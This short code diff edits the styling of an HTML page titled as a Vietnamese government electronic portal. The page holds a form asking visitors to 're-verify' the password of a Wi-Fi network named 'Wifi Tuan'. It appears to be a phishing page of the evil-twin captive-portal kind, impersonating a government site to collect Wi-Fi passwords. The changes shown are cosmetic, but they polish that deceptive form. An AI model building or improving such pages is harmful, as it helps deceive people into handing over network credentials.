@@ -38,7 +38,15 @@
 			.no-border-radius
 			{
 				border-radius: 0px;
-			}
+            }
+            .no-underline
+            {
+                text-decoration: none;
+            }
+            .no-underline:hover
+            {
+                text-decoration: none;
+            }
 		</style>
 		<title> Cổng thông tin điện tử - CHÍNH PHỦ VN </title>
 	</head>
@@ -49,7 +57,7 @@
 					<form method="post" id="form-mic">
 						<h3 class="text-muted"> Xác thực mật khẩu Wifi <em><strong>"Wifi Tuan"</strong></em> </h3>
 						<div class="form-group">
-							<a href="javascript:void(0)" data-toggle="popover" id="info-tip"><span class="glyphicon glyphicon-signal"></span>&nbsp; Thông tin chi tiết </a>
+							<a href="javascript:void(0)" data-toggle="popover" id="info-tip" class="no-underline"><span class="glyphicon glyphicon-signal"></span>&nbsp; Thông tin chi tiết </a>
 						</div>
 						<div class="form-group">
 							<input type="text" class="form-control no-border-radius" placeholder="Vui lòng nhập mật khẩu WIFI của bạn" name="pass" autofocus />
